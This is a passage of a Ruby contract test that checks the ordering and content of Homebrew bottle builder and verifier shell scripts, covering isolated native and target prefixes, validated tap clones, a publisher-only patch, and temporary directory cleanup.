  bootstrap_is_complete = conservative_linux_bootstrap.all? do |name|
    compatibility_lock["formulae"].key?(name)
  end
  check(bootstrap_is_complete,
        "native Homebrew lock omits the conservative Linux bootstrap")
  [
    "homebrew_native_contract_select_api_source()",
    "homebrew_native_contract_install()",
    'GITHUB_ACTIONS:-}" != "true"',
    "GitHub Actions can never take this development-only compatibility path",
    "native host plan changed after signed-API preflight",
    "signed native API preflight is unavailable",
    "zero-root job received populated native API state",
    "homebrew_native_contract_run_logged()",
    "homebrew_native_contract_report_command_failure()",
    "homebrew-native-command-diagnostic.rb",
    "deps --union --include-implicit",
    'admit "$brew_commit" "$overlay_attestation" "$policy" "$purpose"',
    "run_native_brew_logged install --as-dependency --formula",
    'audit-cellar "$brew_commit" "$overlay_attestation" "$prime"',
  ].each do |fragment|
    check(native_install_contract.include?(fragment),
          "shared native Homebrew admission contract lacks #{fragment}")
  end
  check(native_install_contract.scan(
          "run_native_brew_logged install --as-dependency --formula"
        ).length == 1,
        "shared native Homebrew contract has more than one install authority")
  [bottle_builder, bottle_verifier].each do |formula_runner|
    check(formula_runner.include?(
      '. "$KANDELO_ROOT/scripts/homebrew-formula-support-inputs.sh"'
    ) && formula_runner.scan(
      'homebrew_prune_formula_support_tests_from_tapped_clone'
    ).length == 2,
          "Formula runner does not prune primary and dependency execution clones")
    check(formula_runner.include?(
      "PUBLISHER_ISOLATION_PATCH_FILE=\"$KANDELO_ROOT/#{publisher_isolation_patch_path}\""
    ) &&
          formula_runner.include?(
            '"$BREW_BIN" "$PATCH_FILE" "$WORK_DIR" "$PUBLISHER_ISOLATION_PATCH_FILE"'
          ), "Formula runner does not apply the publisher-only isolation patch")
    check(formula_runner.include?('"$BREW_BIN" trust --tap "$TAP_NAME"'),
          "Formula runner does not trust the reviewed tap")
    check(!formula_runner.include?("trust --formula") &&
          !formula_runner.include?("homebrew_seed_reviewed_tap_trust"),
          "Formula runner persists redundant item trust")
    seed_index = formula_runner.index(
      "homebrew_patched_launcher_seed_bundler_groups bottle formula_test"
    )
    isolate_index = formula_runner.index("homebrew_patched_launcher_isolate")
    check(seed_index && isolate_index && seed_index < isolate_index,
          "Formula runner does not seed locked Bundler groups before isolation")
    [
      '.dependencies[] | [.tap_name, .root, .tap_commit] | @tsv',
      'homebrew_local_tap_clone_url "$dependency_root"',
      '"$BREW_BIN" tap "$dependency_tap" "$dependency_tap_clone_url"',
      'tapped_dependency_root="$("$BREW_BIN" --repository "$dependency_tap")"',
      'locked_dependency_root="$(cd "$dependency_root" && pwd -P)"',
      '[ "$tapped_dependency_root" != "$locked_dependency_root" ]',
      '[ "$(git -C "$tapped_dependency_root" rev-parse HEAD)" = "$dependency_commit" ]',
      '[ -z "$(git -C "$tapped_dependency_root" status --short --untracked-files=all)" ]',
    ].each do |fragment|
      check(formula_runner.include?(fragment),
            "Formula runner immutable dependency tap binding lacks #{fragment}")
    end
    dependency_clean_index = formula_runner.index(
      '[ -z "$(git -C "$tapped_dependency_root" status --short --untracked-files=all)" ]'
    )
    dependency_prune_index = formula_runner.index(
      "homebrew_prune_formula_support_tests_from_tapped_clone \\\n" \
      '      "$tapped_dependency_root"'
    )
    check(dependency_clean_index && dependency_prune_index &&
          dependency_clean_index < dependency_prune_index,
          "Formula runner prunes dependency tests before validating the exact clean clone")
    [
      'NATIVE_PREFIX="$(homebrew_patched_launcher_native_prefix_path "$NATIVE_BASE")"',
      'NATIVE_CACHE="$NATIVE_BASE/c"',
      'NATIVE_TEMP="$NATIVE_BASE/t"',
      'NATIVE_CONFIG="$NATIVE_BASE/g"',
      'NATIVE_HOME="$NATIVE_BASE/h"',
      'unset HOMEBREW_RELOCATE_BUILD_PREFIX',
      "homebrew_patched_launcher_prepare_native_prefix",
      'NATIVE_INSTALL_LOG="$CONTROL_DIR/',
      'HOST_DEPENDENCY_PLAN="$CONTROL_DIR/host-dependencies.json"',
      'HOST_DEPENDENCY_LIST="$CONTROL_DIR/host-dependencies.txt"',
      'EXPECTED_PLAN_TAP="$TAP_NAME"',
      '"$TAP_ROOT" "$TAP_NAME" "$FORMULA" --host-dependencies-json',
      'immutable resolved tap map is required',
      'bash "$KANDELO_ROOT/scripts/homebrew-validate-host-dependency-plan.sh"',
      '. "$KANDELO_ROOT/scripts/homebrew-native-install-contract.sh"',
      "homebrew_native_contract_select_api_source",
      "homebrew_native_contract_install",
      '"homebrew/core/$dependency"',
      'homebrew_patched_launcher_run_native info --json=v2',
      'homebrew_native_contract_run_logged',
      'installed-formula-metadata',
      '.formulae[0].name == $name',
      '.formulae[0].full_name == $name',
      '.formulae[0].tap == "homebrew/core"',
      '(.formulae[0].installed | type == "array" and length > 0)',
      "homebrew_native_contract_verify_no_missing_dependencies",
      "homebrew_patched_launcher_seal_native_prefix",
      'homebrew_patched_launcher_bridge_native_formula "$dependency"',
      '"$BREW_BIN" list --formula "$dependency" >/dev/null',
      'homebrew_patched_launcher_run_native "$@" 2>&1 | tee -a "$NATIVE_INSTALL_LOG"',
      '"$NATIVE_INSTALL_LOG" "$native_info"',
      '--install-log "$INSTALL_LOG"',
      'cleanup_and_exit() {',
      'trap \'cleanup_and_exit $?\' EXIT',
      'if homebrew_patched_launcher_cleanup; then',
      'preserving temporary Homebrew realms after cleanup failure',
      '[ "$original_status" -eq 0 ] || return "$original_status"',
      'exit "$cleanup_status"',
    ].each do |fragment|
      check(formula_runner.include?(fragment),
            "Formula runner native/target realm contract lacks #{fragment}")
    end
    check(formula_runner.scan("homebrew_native_contract_install").length == 1 &&
          !formula_runner.include?(
            "run_native_brew_logged install --as-dependency --formula"
          ) &&
          !formula_runner.include?("native_formula_refs"),
          "Formula runner bypasses the shared sequential native install contract")
    check(formula_runner.scan(/>\s*"\$HOST_DEPENDENCY_LIST"/).length == 2,
          "Formula runner has more than one authority for its native dependency plan")
    check(!formula_runner.include?(
            "run_native_brew_logged install --as-dependency --ignore-dependencies"
          ), "Formula runner suppresses native Homebrew's transitive dependency closure")
    check(!formula_runner.include?(
            '"$TAP_ROOT" "$TAP_REPOSITORY" "$FORMULA" --host-dependencies-json'
          ), "Formula runner conflates a third-party repository with its canonical tap name")
    check(!formula_runner.include?('--install-log "$NATIVE_INSTALL_LOG"'),
          "Formula runner includes native Homebrew output in target provenance")
    check(!formula_runner.match?(/run_brew_logged[^\n]*homebrew\/core/),
          "Formula runner installs native core Formulae in the target realm")
    check(formula_runner.scan('chmod 0711 "$NATIVE_BASE"').length == 1 &&
          formula_runner.include?("if [ -n \"\$BUILD_USER\" ]; then\n" \
                                  "  chmod 0711 \"\$NATIVE_BASE\"\nfi"),
          "Formula runner exposes its native parent outside isolated CI")
    check(formula_runner.scan('NATIVE_BASE="$(mktemp -d /tmp/k.XXXXXX)"').length == 1,
          "Formula runner does not use exactly one bounded native prefix")
  end
  build_stage_marker = native_install_contract[
    /homebrew_native_contract_stage_marker\(\) \{\n(.*?)\n\}\n/m,
    1
  ]
  check(build_stage_marker &&
        build_stage_marker.include?('^(starting|completed)$') &&
        build_stage_marker.include?('printf \'%s: %s %s stage\\n\'') &&
        !build_stage_marker.include?('"$@"'),
        "bottle builder stage marker executes the stateful stage")
  check(!native_install_contract.include?(
          "homebrew_native_contract_run_stage"
        ), "native contract retains an errexit-suppressing stage wrapper")
  %w[
    tier2-execution-rescan
    tier2-execution-preflight
    tier2-attestation-staging
    formula-realm-isolation
    signed-native-contract
  ].each do |stage|
    runners = [bottle_builder]
    runners << bottle_verifier if stage == "signed-native-contract"
    runners.each do |runner|
      starting = "homebrew_native_contract_stage_marker #{stage} starting"
      completed = "homebrew_native_contract_stage_marker #{stage} completed"
      check(runner.include?(starting) && runner.include?(completed) &&
            runner.index(starting) < runner.index(completed),
            "Formula runner does not bound the #{stage} stage")
    end
  end
  builder_tap_clone_index = bottle_builder.index(
    '"$BREW_BIN" tap "$TAP_NAME" "$PRIMARY_TAP_CLONE_URL"'
  )
  builder_clean_clone_index = bottle_builder.index(
    'git -C "$TAPPED_TAP_ROOT" rev-parse HEAD'
  )
  builder_primary_authority_index = bottle_builder.index(
    'export HOMEBREW_KANDELO_PRIMARY_TAP_ROOT="$TAPPED_TAP_ROOT"'
  )
  builder_primary_prune_index = bottle_builder.index(
    'homebrew_prune_formula_support_tests_from_tapped_clone "$TAPPED_TAP_ROOT"'
  )
  builder_execution_rescan_index = bottle_builder.index(
    '"$TAPPED_TAP_ROOT" "$TAP_NAME" "$FORMULA" --tier2-bridge-json'
  )
  builder_isolate_index = bottle_builder.index(
    'homebrew_patched_launcher_isolate "$BUILD_USER"'
  )
  check(builder_tap_clone_index && builder_clean_clone_index &&
        builder_primary_authority_index && builder_primary_prune_index &&
        builder_execution_rescan_index &&
        builder_isolate_index &&
        builder_tap_clone_index < builder_clean_clone_index &&
        builder_clean_clone_index < builder_primary_authority_index &&
        builder_primary_authority_index < builder_primary_prune_index &&
        builder_primary_prune_index < builder_execution_rescan_index &&
        builder_execution_rescan_index < builder_isolate_index,
        "reviewed bottle builder exposes support tests or prunes an unvalidated primary clone")
  check(bottle_builder.include?('rm -rf "$NATIVE_BASE" "$WORK_DIR"'),
        "reviewed bottle builder does not remove its temporary realms")
  protected_bottle_stage_index = bottle_verifier.index(
    'homebrew_patched_launcher_stage_protected_input'
  )
  local_bottle_pour_index = bottle_verifier.index(
    'run_brew_logged "$BREW_BIN" install --force-bottle --ignore-dependencies "$BOTTLE"'
  )
  [
    'if [ "$SELECTION_MODE" = "local-dry-run" ]; then',
    'homebrew_patched_launcher_stage_protected_input',
    '"$BUILD_USER" "$SHARED_TEMP" "$BOTTLE" "$EXPECTED_BOTTLE_FILENAME"',
    'PROTECTED_BOTTLE="$HOMEBREW_PATCHED_STAGED_INPUT_PATH"',
    'sha256sum "$PROTECTED_BOTTLE"',
    'wc -c <"$PROTECTED_BOTTLE"',
    'BOTTLE="$PROTECTED_BOTTLE"',
    '"$KANDELO_HOMEBREW_SUDO_BIN" -n -- /usr/bin/rm -rf --',
    'realm_cleanup_status="$?"',
    'could not remove temporary Homebrew realms',
    '[ "$launcher_status" -eq 0 ] || return "$launcher_status"',
    'return "$realm_cleanup_status"',
  ].each do |fragment|
    check(bottle_verifier.include?(fragment),
          "reviewed bottle verifier protected input contract lacks #{fragment}")
  end
  verifier_isolate_index = bottle_verifier.index(
    'homebrew_patched_launcher_isolate "$BUILD_USER"'
  )
  check(verifier_isolate_index && protected_bottle_stage_index &&
        local_bottle_pour_index &&
        verifier_isolate_index < protected_bottle_stage_index &&
        protected_bottle_stage_index < local_bottle_pour_index,
        "reviewed bottle verifier does not protect the selected archive before the isolated pour")
  [
    'TARGET_OPT_PREFIX="$("$BREW_BIN" --prefix "$FORMULA_REF")"',
    'EXPECTED_TARGET_OPT_PREFIX="$HOMEBREW_PATCHED_PREFIX/opt/$FORMULA"',
    '[ "$TARGET_OPT_PREFIX" = "$EXPECTED_TARGET_OPT_PREFIX" ]',
    'target Formula opt prefix is not canonical',
    'TARGET_PREFIX="$(cd "$TARGET_OPT_PREFIX" && pwd -P)"',
    'target Formula opt prefix does not resolve',
    'TARGET_RACK="$HOMEBREW_PATCHED_PREFIX/Cellar/$FORMULA"',
    '[ -d "$TARGET_RACK" ] && [ ! -L "$TARGET_RACK" ]',
    'target Formula Cellar rack is not a real directory',
    'TARGET_RACK="$(cd "$TARGET_RACK" && pwd -P)"',
    'target Formula Cellar rack does not resolve',
    'EXPECTED_TARGET_PREFIX="$TARGET_RACK/$PKG_VERSION"',
    '[ -d "$EXPECTED_TARGET_PREFIX" ] && [ ! -L "$EXPECTED_TARGET_PREFIX" ]',
    'expected target Formula keg is not a real directory',
    'EXPECTED_TARGET_PREFIX="$(cd "$EXPECTED_TARGET_PREFIX" && pwd -P)"',
    'expected target Formula keg does not resolve',
    '[ "$TARGET_PREFIX" = "$EXPECTED_TARGET_PREFIX" ]',
    'target Formula opt prefix does not select the exact versioned keg',
  ].each do |fragment|
    check(bottle_verifier.include?(fragment),
          "reviewed bottle verifier target-keg contract lacks #{fragment}")
  end
  target_opt_index = bottle_verifier.index(
    'TARGET_OPT_PREFIX="$("$BREW_BIN" --prefix "$FORMULA_REF")"'
  )
  target_real_index = bottle_verifier.index(
    'TARGET_PREFIX="$(cd "$TARGET_OPT_PREFIX" && pwd -P)"'
  )
  exact_target_index = bottle_verifier.index(
    '[ "$TARGET_PREFIX" = "$EXPECTED_TARGET_PREFIX" ]'
  )
  target_test_index = bottle_verifier.index(
    'run_brew_logged "$BREW_BIN" test "$FORMULA_REF"'
  )
  runtime_evidence_index = bottle_verifier.index(
    'homebrew-bottle-runtime-evidence.py" capture'
  )
  check(local_bottle_pour_index && target_opt_index && target_real_index && exact_target_index &&
        target_test_index && runtime_evidence_index &&
        local_bottle_pour_index < target_opt_index &&
        target_opt_index < target_real_index && target_real_index < exact_target_index &&
        exact_target_index < target_test_index &&
        target_test_index < runtime_evidence_index,
        "reviewed bottle verifier does not select the exact installed keg before evidence capture")
  reconstructed_source_index = bottle_verifier.index(
    'mapfile -t source_tap_changes'
  )
  tap_clone_index = bottle_verifier.index(
    '"$BREW_BIN" tap "$TAP_NAME" "$PRIMARY_TAP_CLONE_URL"'
  )
  clean_clone_index = bottle_verifier.index(
    'git -C "$TAPPED_TAP_ROOT" rev-parse HEAD'
  )
  materialize_formula_index = bottle_verifier.index(
    'cp -- "$TAP_ROOT/$RECONSTRUCTED_FORMULA_RELATIVE"'
  )
  selected_formula_index = bottle_verifier.index(
    'mapfile -t selected_tap_changes'
  )
  selected_formula_compare_index = bottle_verifier.index(
    'cmp -s "$TAPPED_TAP_ROOT/$RECONSTRUCTED_FORMULA_RELATIVE"'
  )
  verifier_primary_unset_index = bottle_verifier.index(
    'unset HOMEBREW_KANDELO_PRIMARY_TAP_ROOT'
  )
  verifier_launcher_prepare_index = bottle_verifier.index(
    'homebrew_patched_launcher_prepare \\'
  )
  verifier_primary_authority_index = bottle_verifier.index(
    'export HOMEBREW_KANDELO_PRIMARY_TAP_ROOT="$TAPPED_TAP_ROOT"'
  )
  primary_test_prune_index = bottle_verifier.rindex(
    'homebrew_prune_formula_support_tests_from_tapped_clone "$TAPPED_TAP_ROOT"'
  )
  verifier_isolate_after_prune_index = bottle_verifier.index(
    'homebrew_patched_launcher_isolate "$BUILD_USER"', primary_test_prune_index || 0
  )
  verifier_deps_after_prune_index = bottle_verifier.index(
    'deps --topological --full-name --formula "$FORMULA_REF"',
    primary_test_prune_index || 0
  )
  check(
    bottle_verifier.include?(
      'RECONSTRUCTED_FORMULA_RELATIVE="Formula/$FORMULA.rb"'
    ) &&
      bottle_verifier.include?(
        'git -C "$TAP_ROOT" status --short --untracked-files=all'
      ) &&
      bottle_verifier.include?(
        '[ -f "$TAP_ROOT/$RECONSTRUCTED_FORMULA_RELATIVE" ]'
      ) &&
      bottle_verifier.include?(
        '[ ! -L "$TAP_ROOT/$RECONSTRUCTED_FORMULA_RELATIVE" ]'
      ) &&
      bottle_verifier.include?(
        "case \"${#source_tap_changes[@]}\" in\n  0) ;;\n  1)"
      ) &&
      bottle_verifier.include?(
        '"${source_tap_changes[0]}" = " M $RECONSTRUCTED_FORMULA_RELATIVE"'
      ) &&
      bottle_verifier.include?('[ "$TAPPED_TAP_ROOT" != "$TAP_ROOT" ]') &&
      bottle_verifier.include?(
        '[ -f "$TAPPED_TAP_ROOT/$RECONSTRUCTED_FORMULA_RELATIVE" ]'
      ) &&
      bottle_verifier.include?(
        '[ ! -L "$TAPPED_TAP_ROOT/$RECONSTRUCTED_FORMULA_RELATIVE" ]'
      ) &&
      bottle_verifier.include?(
        "case \"${#selected_tap_changes[@]}\" in\n  0) ;;\n  1)"
      ) &&
      bottle_verifier.include?(
        '"${selected_tap_changes[0]}" = " M $RECONSTRUCTED_FORMULA_RELATIVE"'
      ) &&
      bottle_verifier.include?(
        'cmp -s "$TAPPED_TAP_ROOT/$RECONSTRUCTED_FORMULA_RELATIVE"'
      ) &&
      !bottle_verifier.include?(' -ef "$TAP_ROOT/Formula/$FORMULA.rb"') &&
      reconstructed_source_index && tap_clone_index && clean_clone_index &&
      materialize_formula_index && selected_formula_index &&
      selected_formula_compare_index && verifier_primary_unset_index &&
      verifier_launcher_prepare_index && verifier_primary_authority_index &&
      primary_test_prune_index &&
      verifier_primary_unset_index < verifier_launcher_prepare_index &&
      reconstructed_source_index < tap_clone_index &&
      tap_clone_index < clean_clone_index &&
      clean_clone_index < materialize_formula_index &&
      materialize_formula_index < selected_formula_index &&
      selected_formula_index < selected_formula_compare_index &&
      selected_formula_compare_index < verifier_primary_authority_index &&
      verifier_primary_authority_index < primary_test_prune_index &&
      verifier_isolate_after_prune_index && verifier_deps_after_prune_index &&
      primary_test_prune_index < verifier_isolate_after_prune_index &&
      primary_test_prune_index < verifier_deps_after_prune_index,
    "bottle verifier does not materialize only the reconstructed Formula into the planned Homebrew tap clone"
  )
  [
    "diff --git a/Library/Homebrew/build.rb b/Library/Homebrew/build.rb",
    "diff --git a/Library/Homebrew/dev-cmd/bottle.rb b/Library/Homebrew/dev-cmd/bottle.rb",
    'require "kandelo_publisher"',
    "diff --git a/Library/Homebrew/kandelo_publisher.rb b/Library/Homebrew/kandelo_publisher.rb",
    "module KandeloPublisher",
    "def self.active?",
    'GNU_TAR_PATH = ENV.fetch(GNU_TAR_ENV, "").dup.freeze',
    "def self.reproducible_gnu_tar",
    "publisher_gnu_tar = KandeloPublisher.reproducible_gnu_tar",
    "reproducible_gnutar_args(mtime)",
    "def self.prepare_archived_tab!(tab, expected_tap:, expected_tap_git_head:)",
    'source["tap"] == expected_tap',
    "tap_git_head == expected_tap_git_head",
    "archived_source = source.dup",
    'archived_source.delete("tap_git_head")',
    "tab.source = archived_source",
    "expected_tap:          tap.name",
    "expected_tap_git_head: tap_git_revision",
    "FileUtils.touch(bottle_path, mtime: tab_source_modified_time)",
    "def self.dependency_plan(formula = nil, require_match: true)",
    "def self.selected_tap_formula?(formula)",
    'tap.keys.sort == %w[tap_commit tap_name tap_repository]',
    'tap_repository == "#{owner}/homebrew-#{short_name}"',
    'TAP_GIT_HEAD.match?(tap["tap_commit"])',
    'target_names == target_names.sort.uniq',
    'tap.fetch("tap_name")',
    'PLAN_FILENAME = ".kandelo-publisher-build-dependencies.json"',
    "plan_path = HOMEBREW_PREFIX/PLAN_FILENAME",
    "plan = KandeloPublisher.dependency_plan(formula)",
    "@deps = publisher_build_dependencies if args.build_bottle?",
    "dependency.build? && !dependency.implicit?",
    "def self.evaluated_native_requirements(formula, plan = dependency_plan(formula))",
    'NATIVE_FORMULA_CONSTANT = :KANDELO_NATIVE_FORMULA',
    'NATIVE_SENTINEL_CONSTANT = :KANDELO_NATIVE_SENTINEL',
    'Dependency.new(requirement.fetch("formula"), [:build])',
    'actual == expected',
    'plan["schema"] == 4',
    "MAX_DEPENDENCIES = 128",
    "value.length <= MAX_DEPENDENCIES",
    "direct_native_build_dependencies.sort_by(&:name)",
    "def self.activate_native_test_requirements!(formula, env)",
    "Kandelo publisher native test Requirement sentinel is unavailable",
    "diff --git a/Library/Homebrew/test.rb b/Library/Homebrew/test.rb",
    "KandeloPublisher.activate_native_test_requirements!(formula, ENV)",
    "diff --git a/Library/Homebrew/extend/os/linux/formula.rb b/Library/Homebrew/extend/os/linux/formula.rb",
    "return if KandeloPublisher.selected_tap_formula?(self)",
    "diff --git a/Library/Homebrew/extend/os/linux/sandbox.rb b/Library/Homebrew/extend/os/linux/sandbox.rb",
    "return if KandeloPublisher.active?",
    "diff --git a/Library/Homebrew/diagnostic.rb b/Library/Homebrew/diagnostic.rb",
    ".reject { |dir| dir == HOMEBREW_REPOSITORY }",
    "diff --git a/Library/Homebrew/trust.rb b/Library/Homebrew/trust.rb",
    "next if trusted_tap?(tap)",
    "explicit `brew trust` operations still use the normal mutation path",
  ].each do |fragment|
    check(publisher_isolation_patch.include?(fragment),
          "publisher-only isolation patch lacks #{fragment}")
  end
  check(publisher_isolation_patch_header.include?(
          "applied only to the publisher's temporary Homebrew overlay"
        ), "publisher-only isolation patch lacks publisher-only scope")
  check(!publisher_isolation_patch.include?('+    source.delete("tap_git_head")'),
        "publisher patch mutates the shallow-copied installed receipt source")
  publisher_patch_test = File.read(
    File.join(REPO_ROOT, "scripts/test-homebrew-publisher-overlay-patch.sh")
  )
  [
    '"--mtime=#{mtime}"',
    '"--sort=name"',
    '"--owner=0", "--group=0", "--numeric-owner"',
    '"--format=pax"',
    'globexthdr.name=/GlobalHead.%n,exthdr.name=%d/PaxHeaders/%f,delete=atime,delete=ctime',
    'ENV["HOMEBREW_KANDELO_GNU_TAR"] = "/tmp/formula-controlled-tar"',
    "successful bottle did not restore the exact installed receipt bytes",
    "failed bottle did not restore the exact installed receipt bytes",
    "publisher accepted mismatched archived receipt provenance",
    "ordinary Homebrew receipt behavior changed without a protected publisher plan",
    "recursive same-tap Formula retained native Linux global dependencies",
    "recursive locked-tap Formula retained native Linux global dependencies",
    "protected publisher plan changed Linux global dependencies for another tap",
    "protected publisher plan changed native Homebrew global dependencies",
    "mutable target tap revision suppressed Linux global dependencies",
    "mismatched target tap repository suppressed Linux global dependencies",
    "publisher native Requirement inputs did not populate the build-only Superenv dependency path",
    "publisher accepted a missing evaluated native Requirement",
    "publisher accepted a forged evaluated native Requirement class",
    "publisher accepted altered evaluated native Requirement metadata",
    "publisher accepted ambiguous schema-3 native dependency data",
    "publisher accepted oversized host dependency arrays",
    "publisher test environment did not execute the sealed Requirement sentinel by name",
    "ordinary Homebrew test environment changed without a protected publisher plan",
  ].each do |fragment|
    check(publisher_patch_test.include?(fragment),
          "publisher overlay regression test lacks #{fragment}")
  end
  publisher_real_lifecycle_test = File.read(
    File.join(REPO_ROOT, "scripts/test-homebrew-publisher-real-lifecycle.sh")
  )
  [
    'BREW_COMMIT="a92554a538e81fad0c5074443885dbcc4c36221d"',
    'EXPECTED_BUILD_BLOB="be833176c02f78cd5b3502aac968b5a733cb7af8"',
    'EXPECTED_MAC_SANDBOX_BLOB="b81da0fd8878e6a6de1171e0cb7a08a86b4be561"',
    'EXPECTED_BUNDLE_VENDOR_VERSION="8"',
    'worktree add --detach "$BREW_ROOT" "$BREW_COMMIT"',
    '0001-add-kandelo-wasm-bottle-tags.patch',
    '0002-support-isolated-publisher.patch',
    'HOMEBREW_KANDELO_HERMETIC_LIFECYCLE_TEST',
    'PATH="$PATH"',
    'install-bundler-gems --groups=formula_test',
    '(deny network*)',
    '/usr/bin/unshare --user --map-current-user --net',
    '/usr/bin/sudo -n /usr/bin/unshare --net',
    'the network-isolation boundary allowed a reachable socket',
    'the real publisher lifecycle changed the sealed Bundler vendor tree',
    'depends_on KandeloFormulaSupport::WabtRequirement => [:build, :test]',
    'KANDELO_HOMEBREW_RESOLVED_TAPS_FILE="$RESOLVED_TAPS"',
    'homebrew-formula-runtime-closure.rb',
    'homebrew-validate-host-dependency-plan.sh',
    'install --build-bottle',
    '--ignore-dependencies kandelo-dev/tap-core/fixture',
    'test kandelo-dev/tap-core/fixture',
    'the real Build/Superenv lifecycle did not execute the native Requirement tool',
    'the real Formula test lifecycle did not execute the sealed native Requirement tool',
  ].each do |fragment|
    check(publisher_real_lifecycle_test.include?(fragment),
          "real pinned Homebrew lifecycle test lacks #{fragment}")
  end
  check(!platform_patch.include?("dir == HOMEBREW_REPOSITORY"),
        "guest Homebrew platform patch skips repository writability")
  check(!platform_patch.include?("trusted_tap?(tap)"),
        "guest Homebrew platform patch includes publisher trust behavior")
  check(!platform_patch.include?("KandeloPublisher") &&
        !platform_patch.include?("add_global_deps_to_spec"),
        "guest Homebrew platform patch suppresses Linux global dependencies")
  check(!platform_patch.include?("HOMEBREW_KANDELO_GNU_TAR") &&
        !platform_patch.include?("reproducible_gnutar_args") &&
        !platform_patch.include?("prepare_archived_tab!"),
        "guest Homebrew platform patch includes publisher-only bottle normalization")
  [
    "diff --git a/Library/Homebrew/github_packages.rb b/Library/Homebrew/github_packages.rb",
    "# An explicit repository-rooted package path is not a generated tap name.",
    '"#{URL_PREFIX}#{org.downcase}/#{repo}"',
  ].each do |fragment|
    check(platform_patch.include?(fragment),
          "guest Homebrew platform patch lacks repository-root preservation: #{fragment}")
  end
  check(platform_patch.include?("-    root_url(org, repo)"),
        "guest Homebrew platform patch does not replace upstream GHCR root shortening")
  bootstrap_builder = File.read(File.join(REPO_ROOT, "scripts/build-homebrew-bootstrap.sh"))
  check(!bootstrap_builder.include?(publisher_isolation_patch_path),
        "guest Homebrew bootstrap applies the publisher-only isolation patch")
  [
    'NATIVE_BASE="$(mktemp -d /tmp/k.XXXXXX)"',
    'DEPENDENCY_LIST="$CONTROL_DIR/dependencies.txt"',
    'TEST_DEPENDENCY_LIST="$CONTROL_DIR/test-dependencies.txt"',
    'SAME_TAP_TEST_DEPENDENCY_LIST="$CONTROL_DIR/same-tap-test-dependencies.txt"',
    'HOST_DEPENDENCY_LIST="$CONTROL_DIR/host-dependencies.txt"',
    'HOST_DEPENDENCY_PLAN="$CONTROL_DIR/host-dependencies.json"',
    'NATIVE_INSTALL_LOG="$CONTROL_DIR/native-install.log"',
    'DEPENDENCY_POUR_LIST="$CONTROL_DIR/pour-dependencies.txt"',
    'VERIFIED_DEPENDENCY_CACHE_EVIDENCE="$CONTROL_DIR/verified-dependency-cache-evidence.json"',
    'bash "$KANDELO_ROOT/scripts/homebrew-validate-host-dependency-plan.sh"',
    "--include-test",
    'validate_dependency_list "$DEPENDENCY_LIST"',
    '"$SAME_TAP_TEST_DEPENDENCY_LIST" "test dependency list"',
    'validate_dependency_list "$DEPENDENCY_POUR_LIST"',
    'validate_dependency_list "$HOST_DEPENDENCY_LIST"',
    'jq -r \'.runtime_and_test[]\' "$HOST_DEPENDENCY_PLAN" >"$HOST_DEPENDENCY_LIST"',
    'homebrew_patched_launcher_stage_dependency_plan "$HOST_DEPENDENCY_PLAN"',
    'done <"$DEPENDENCY_POUR_LIST"',
    'dependency_cache_args=(',
    'capture-cache',
    '--cache-root "$HOMEBREW_CACHE"',
    '--out "$VERIFIED_DEPENDENCY_CACHE_EVIDENCE"',
    '--cache-evidence "$VERIFIED_DEPENDENCY_CACHE_EVIDENCE"',
    'done <"$HOST_DEPENDENCY_LIST"',
    '"$BREW_BIN" list --formula "$dependency" >/dev/null',
    'target Homebrew rejected the native Formula proxy keg',
    'unset HOMEBREW_KANDELO_BOTTLE_TAG KANDELO_HOMEBREW_BOTTLE_TAG',
    '--expected-dependencies "$DEPENDENCY_LIST"',
  ].each do |fragment|
    check(bottle_verifier.include?(fragment), "reviewed bottle verifier lacks #{fragment}")
  end
  check(!bottle_verifier.include?("--only-dependencies"),
        "reviewed bottle verifier reintroduced the target's pure build closure")
  verifier_runtime_dependency_index = bottle_verifier.index(
    'deps --topological --full-name --formula "$FORMULA_REF"'
  )
  verifier_test_dependency_index = bottle_verifier.index(
    'deps --topological --full-name --include-test'
  )
  verifier_host_plan_index = bottle_verifier.index("--host-dependencies-json")
  verifier_plan_stage_index = bottle_verifier.index(
    'homebrew_patched_launcher_stage_dependency_plan "$HOST_DEPENDENCY_PLAN"'
  )
  verifier_native_install_index = bottle_verifier.index(
    "homebrew_native_contract_install"
  )
  verifier_native_info_index = bottle_verifier.index(
    "homebrew_patched_launcher_run_native info --json=v2"
  )
  verifier_native_missing_index = bottle_verifier.index(
    "homebrew_native_contract_verify_no_missing_dependencies"
  )
  verifier_native_seal_index = bottle_verifier.index(
    "homebrew_patched_launcher_seal_native_prefix"
  )
  verifier_native_bridge_index = bottle_verifier.index(
    "homebrew_patched_launcher_bridge_native_formula"
  )
  verifier_native_proxy_index = bottle_verifier.index(
    '"$BREW_BIN" list --formula "$dependency"'
  )
  verifier_dependency_pour_index = bottle_verifier.index(
    'run_brew_logged run_brew_for_kandelo_bottles "$BREW_BIN" install'
  )
  verifier_dependency_cache_index = bottle_verifier.index(
    "dependency_cache_args=("
  )
  verifier_cache_clear_index = bottle_verifier.index(
    'find "$HOMEBREW_CACHE" -mindepth 1 -delete'
  )
  verifier_target_install_index = bottle_verifier.index(
    'run_brew_logged run_brew_for_kandelo_bottles "$BREW_BIN" install',
    (verifier_dependency_pour_index || -1) + 1
  )
  verifier_formula_test_index = bottle_verifier.index(
    'run_brew_logged "$BREW_BIN" test "$FORMULA_REF"'
  )
  check(verifier_host_plan_index && verifier_plan_stage_index && verifier_native_install_index &&
        verifier_native_info_index && verifier_native_missing_index &&
        verifier_runtime_dependency_index && verifier_test_dependency_index &&
        verifier_native_seal_index && verifier_native_bridge_index &&
        verifier_native_proxy_index &&
        verifier_dependency_pour_index &&
        verifier_dependency_cache_index &&
        verifier_cache_clear_index && verifier_target_install_index &&
        verifier_formula_test_index &&
        verifier_host_plan_index < verifier_plan_stage_index &&
        verifier_plan_stage_index < verifier_native_install_index &&
        verifier_native_install_index < verifier_native_info_index &&
        verifier_native_info_index < verifier_native_missing_index &&
        verifier_native_missing_index < verifier_runtime_dependency_index &&
        verifier_runtime_dependency_index < verifier_test_dependency_index &&
        verifier_test_dependency_index < verifier_native_seal_index &&
        verifier_native_seal_index < verifier_native_bridge_index &&
        verifier_native_bridge_index < verifier_native_proxy_index &&
        verifier_native_proxy_index < verifier_dependency_pour_index &&
        verifier_dependency_pour_index < verifier_dependency_cache_index &&
        verifier_dependency_cache_index < verifier_cache_clear_index &&
        verifier_cache_clear_index < verifier_target_install_index &&
        verifier_target_install_index < verifier_formula_test_index,
        "reviewed bottle verifier mixes native, target, or test phases")
  check(bottle_verifier.include?(
          '--force-bottle --as-dependency --ignore-dependencies --formula "$dependency"'
        ) && bottle_verifier.include?(
          '--force-bottle --ignore-dependencies --formula "$FORMULA_REF"'
        ) && bottle_verifier.include?(
